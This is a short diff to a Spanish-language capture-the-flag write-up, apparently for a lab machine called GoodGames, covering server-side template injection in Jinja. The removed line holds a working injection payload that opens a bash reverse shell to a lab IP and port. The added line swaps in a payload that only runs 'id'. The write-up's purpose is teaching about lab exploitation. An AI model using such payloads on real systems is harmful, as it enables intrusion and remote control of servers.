@@ -153,8 +153,8 @@ Detectamos una vulnerabilidad SSTI (Server Side Template Injection) al modificar
 
 Enviamos una reverse shell a nuestra máquina desde la vulnerabilidad SSTI:
 
-```jinja
-{{ namespace.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.31/1234 0>&1'").read() }}
+```python
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
 ![Código de reverse shell SSTI](/assets/images/goodgames/12-ssti-reverse-shell.png)
